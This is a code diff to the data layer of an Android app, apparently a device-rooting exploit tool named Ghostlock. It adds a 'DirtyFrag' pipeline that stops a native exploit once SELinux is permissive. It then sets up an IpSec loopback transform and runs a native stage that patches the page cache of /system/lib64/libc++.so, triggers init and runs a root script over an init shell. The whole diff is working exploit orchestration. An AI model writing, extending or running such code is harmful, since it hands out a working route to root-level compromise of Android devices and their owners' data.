@@ -3,6 +3,9 @@ package com.ghostlock.app.data
 import android.annotation.SuppressLint
 import android.content.ContentValues
 import android.content.Context
+import android.net.IpSecAlgorithm
+import android.net.IpSecManager
+import android.net.IpSecTransform
 import android.os.Build
 import android.os.SystemClock
 import android.provider.MediaStore
@@ -49,6 +52,9 @@ import java.io.File
 import java.io.FileOutputStream
 import java.io.IOException
 import java.io.RandomAccessFile
+import java.net.DatagramSocket
+import java.net.InetAddress
+import java.security.SecureRandom
 import java.nio.charset.StandardCharsets
 import java.util.Locale
 import java.util.concurrent.TimeUnit
@@ -75,6 +81,8 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
         const val ProbeTimeoutSeconds = 900L
         val AnsiEscape = Regex("\u001B\\[[0-9;]*m")
         const val PrefForceAttackTest = "force_attack_test"
+        /* Second way: W1-only run followed by the DirtyFrag page-cache stage. */
+        const val PrefSecondWay = "second_way"
         /** Tri-state vr.ko choices, stored as auto/on/off (legacy booleans are migrated). */
         const val PrefVrKoTagClear = "vr_ko_tag_clear"
         const val PrefVrKoSelinuxBlock = "vrko_selinux_block"
@@ -138,6 +146,7 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
     private var selectedCpuPair = 0
     private var safeModeEnabled = false
     private var forceAttackTest = false
+    private var secondWay = false
     private var vrKoTagClear = VrKoMode.AUTO
     private var vrKoSelinuxBlock = VrKoMode.AUTO
     private var shizukuEnabled = false
@@ -151,6 +160,7 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
         restoreCpuPair()
         restoreShizukuPreference()
         restoreForceAttackTest()
+        restoreSecondWay()
         restoreVrKoTagClear()
         restoreVrKoSelinuxBlock()
         dropLegacyOffsetsCache()
@@ -235,6 +245,7 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
             selectedCpuPair = selectedCpuPair,
             safeModeEnabled = safeModeEnabled,
             forceAttackTest = forceAttackTest,
+            secondWay = secondWay,
             vrKoTagClear = vrKoTagClear,
             vrKoSelinuxBlock = vrKoSelinuxBlock,
             recommendShizuku = recommendShizuku,
@@ -259,6 +270,11 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
     override fun setForceAttackTest(enabled: Boolean) {
         forceAttackTest = enabled
         preferences.edit { putBoolean(PrefForceAttackTest, enabled) }
+    }
+
+    override fun setSecondWay(enabled: Boolean) {
+        secondWay = enabled
+        preferences.edit { putBoolean(PrefSecondWay, enabled) }
     }
 
     override fun setVrKoTagClear(mode: VrKoMode) {
@@ -848,6 +864,20 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                 }
 
                 else -> {
+                    val pipeline = config.pipeline?.lowercase() ?: "ghostlock"
+                    if (config.pipeline == null) {
+                        archivedLog(
+                            "<s> pipeline=ghostlock (legacy default; profile has no " +
+                                "pipeline key)",
+                        )
+                    }
+                    if (pipeline != "ghostlock") {
+                        archivedLog(
+                            "<s> error: profile pipeline=$pipeline; the Shizuku path " +
+                                "does not carry the pipeline selection yet (use the direct path)",
+                        )
+                        return@withDebugAttackLog 1
+                    }
                     /* Mirror the UserService patch so the dumped blob is the
                      * effective one native will actually receive. */
                     val runtimeBlob = if (safeModeEnabled) {
@@ -1099,6 +1129,81 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
     override fun setShizukuStatusListener(listener: (() -> Unit)?) =
         shizukuRunner.setStatusListener(listener)
 
+    /* Second way (DirtyFrag hybrid): the W1-only native run has left SELinux
+     * permissive. Create the IpSec transport transform, compute the page-cache
+     * plan (the app owns every IV), and run the native stage that patches
+     * libc++, triggers init, runs the root script over the init shell and
+     * restores the blocks. */
+    private suspend fun runDirtyfragStage(onLog: (String) -> Unit, debugDir: String?): Int {
+        val ipsec = appContext.getSystemService(Context.IPSEC_SERVICE) as? IpSecManager
+            ?: run {
+                onLog("<-> second way: IpSecManager unavailable")
+                return 1
+            }
+        val loopback = InetAddress.getByName("127.0.0.1")
+        val encap = ipsec.openUdpEncapsulationSocket()
+        val spiObj = ipsec.allocateSecurityParameterIndex(loopback)
+        val key = ByteArray(32).also { SecureRandom().nextBytes(it) }
+        val senderProbe = DatagramSocket()
+        val senderPort = senderProbe.localPort
+        senderProbe.close()
+        val transform = IpSecTransform.Builder(appContext)
+            .setEncryption(IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, key))
+            .setIpv4Encapsulation(encap, senderPort)
+            .buildTransportModeTransform(loopback, spiObj)
+        try {
+            val random = SecureRandom()
+            val alphabet = "abcdefghijklmnopqrstuvwxyz0123456789"
+            val socketName = buildString {
+                repeat(8) { append(alphabet[random.nextInt(alphabet.length)]) }
+            }
+            val plan = DirtyfragPlan.build(
+                appContext,
+                File("/system/lib64/libc++.so"),
+                key,
+                spiObj.spi,
+                senderPort,
+                encap.port,
+                socketName,
+                File(filesDir, "dirtyfrag.plan"),
+            )
+            onLog("<k> second way: plan ${plan.name} socket=@$socketName")
+            /* Test hook: a debug file selects the native diagnostic mode
+             * (noshell / noscript); anything else, or no file, is the product
+             * path. The root script reads the same file for "noinstrument". */
+            val modeText = runCatching { File(filesDir, "dirtyfrag.mode").readText() }.getOrDefault("")
+            val dirtyfragMode = when {
+                modeText.contains("noshell") -> "noshell"
+                modeText.contains("noscript") -> "noscript"
+                modeText.contains("laterestore") -> "laterestore"
+                else -> "full"
+            }
+            onLog("<k> second way: mode=$dirtyfragMode")
+            val binary = File(appContext.applicationInfo.nativeLibraryDir, NativeBinaryName)
+            val command = ProcessBuilder(
+                binary.absolutePath,
+                "--dirtyfrag",
+                plan.absolutePath,
+                "--dirtyfrag-mode",
+                dirtyfragMode,
+            )
+                .directory(filesDir)
+                .redirectErrorStream(true)
+                .apply {
+                    environment()["GHOSTLOCK_HOME"] = filesDir.absolutePath
+                    environment()["TMPDIR"] = filesDir.absolutePath
+                    environment()["HOME"] = filesDir.absolutePath
+                }
+            val code = runProcess(command, onLog = onLog, captureOutput = true, timeoutSeconds = 120L)
+            onLog("<b> second way: dirtyfrag exited code=$code")
+            return code
+        } finally {
+            runCatching { transform.close() }
+            runCatching { spiObj.close() }
+            runCatching { encap.close() }
+        }
+    }
+
     private suspend fun runExploitBinary(
         pair: CpuPair,
         binaryName: String,
@@ -1136,6 +1241,35 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                     "profile has ${config.invalidPaths.size} invalid field(s): " +
                         config.invalidPaths.take(6).joinToString(),
                 )
+            }
+            /* The profile selects the pipeline; the Advanced toggle is a
+             * debug-only override. A profile without the key predates the
+             * selector and is refused, never defaulted. */
+            val pipeline = run {
+                val fromProfile = config.pipeline?.lowercase()
+                if (BuildConfig.DEBUG && secondWay) {
+                    onLog(
+                        "<k> pipeline=dirtyfrag (debug override; profile=" +
+                            "${fromProfile ?: "legacy default ghostlock"})",
+                    )
+                    "dirtyfrag"
+                } else {
+                    when (fromProfile) {
+                        "ghostlock", "dirtyfrag" -> {
+                            onLog("<k> pipeline=$fromProfile (profile)")
+                            fromProfile
+                        }
+                        /* Every profile authored before the selector was a
+                         * GhostLock plan; the default preserves that intent. */
+                        null -> "ghostlock".also {
+                            onLog(
+                                "<k> pipeline=ghostlock (legacy default; profile has " +
+                                    "no pipeline key)",
+                            )
+                        }
+                        else -> error("profile has unknown pipeline '$fromProfile'")
+                    }
+                }
             }
             var profileBlob = profileController.nativeDocument(config)
                 ?: error("profile is unavailable for $release")
@@ -1178,6 +1312,10 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
             if (forceAttackTest) {
                 argv += "--force-attack"
             }
+            if (pipeline == "dirtyfrag") {
+                /* Stop after W1 (SELinux permissive) and run the DirtyFrag stage. */
+                argv += "--w1-only"
+            }
             if (!debugDir.isNullOrEmpty()) {
                 argv += listOf("--dump-kernel-log", debugDir)
             }
@@ -1218,7 +1356,12 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
                     onProcess = { processRef.set(it) },
                 )
                 onLog("<b> native exited code=$nativeCode")
-                nativeCode
+                if (pipeline == "dirtyfrag" && nativeCode == 0) {
+                    onLog("<b> pipeline=dirtyfrag: W1 done; starting the DirtyFrag stage")
+                    runDirtyfragStage(onLog, debugDir)
+                } else {
+                    nativeCode
+                }
             } finally {
                 withContext(Dispatchers.IO) {
                     tailer.interrupt()
@@ -1596,6 +1739,10 @@ class AndroidGhostlockRepository(context: Context) : GhostlockRepository {
 
     private fun restoreForceAttackTest() {
         forceAttackTest = preferences.getBoolean(PrefForceAttackTest, false)
+    }
+
+    private fun restoreSecondWay() {
+        secondWay = preferences.getBoolean(PrefSecondWay, false)
     }
 
     private fun restoreVrKoTagClear() {
